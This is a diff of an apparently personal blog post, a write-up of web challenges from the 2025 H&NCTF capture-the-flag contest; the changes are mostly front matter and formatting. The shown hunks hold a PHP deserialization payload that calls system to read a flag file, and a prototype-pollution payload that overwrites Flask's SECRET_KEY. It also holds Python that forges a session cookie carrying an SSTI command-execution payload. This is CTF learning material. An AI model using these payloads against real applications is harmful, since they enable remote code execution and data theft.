@@ -1,12 +1,12 @@
 ---
-
-title: "2025H&amp;NCTF web"
+title: 2025 H&NCTF Web
 date: 2025-06-09 23:32:24
 author: Xendr1a
-
+categories: [CTF题解, H&NCTF]
+tags: [H&NCTF, Writeup]
+description: 2025H&NCTF web，题目思路与 payload 记录。
+toc: true
 ---
-
-
 
 2025H&NCTF web
 
@@ -34,7 +34,7 @@ error_reporting(0);class GOGOGO{    public $dengchao;    function __destruct(){ 
 
 我们把结果最后面的i:1;i:0;改为i:0;i:0;
 
-```
+```text
 data=a:2:{i:0;O:6:"GOGOGO":1:{s:8:"dengchao";O:6:"DouBao":3:{s:3:"dao";a:2:{i:0;O:8:"HeiCaFei":1:{s:9:"HongCaFei";s:6:"system";}i:1;s:23:"cat /ofl1111111111ove4g";}s:9:"Dagongren";a:1:{i:0;i:1;}s:9:"Bagongren";a:1:{i:0;i:2;}}}i:0;i:0;}
 
 DeceptiFlag
@@ -118,7 +118,7 @@ from flask import Flask, session, request, render_template_string, render_templa
 
 name和permission，但是我们不知道它的key要怎么伪造呢，我们又想到了原型链污染，我们可以把这个随机的key污染成一个我们想要的key，SECRET_KEY 一般存储在 Flask 应用对象的 config 属性，那我们就可以写了
 
-{"__globals__" : {"app" : {"config" : {"SECRET_KEY":"111"}}}}污染了后就是ssti了from flask.sessions import SecureCookieSessionInterfaceclass MockApp:    def __init__(self):        self.secret_key = '111'        self.config = {            'SECRET_KEY': self.secret_key,            'SECRET_KEY_FALLBACKS': []        }session_data = {    "name": "admin",    "permission": '{{self.__init__.__globals__.__builtins__["__import__"]("os").popen("cat 4flloog").read()}}'}serializer = SecureCookieSessionInterface().get_signing_serializer(MockApp())cookie_value = serializer.dumps(session_data)print(cookie_value)
+{"__globals__" : {"app" : {"config" : {"SECRET_KEY":"111"}}}}污染了后就是ssti了from flask.sessions import SecureCookieSessionInterfaceclass MockApp:    def __init__(self):        self.secret_key = '111'        self.config = {            'SECRET_KEY': self.secret_key,            'SECRET_KEY_FALLBACKS': []        }session_data = {    "name": "admin",    "permission": '{% raw %}{{{% endraw %}self.__init__.__globals__.__builtins__["__import__"]("os").popen("cat 4flloog").read()}}'}serializer = SecureCookieSessionInterface().get_signing_serializer(MockApp())cookie_value = serializer.dumps(session_data)print(cookie_value)
 
 去/aaadminnn改session就行了参考自晨曦师傅的wphttps://chenxi9981.github.io/2025H&NCTF_WP/
 
@@ -126,5 +126,3 @@ name和permission，但是我们不知道它的key要怎么伪造呢，我们又
 
 还没写完....
 ```
-
-
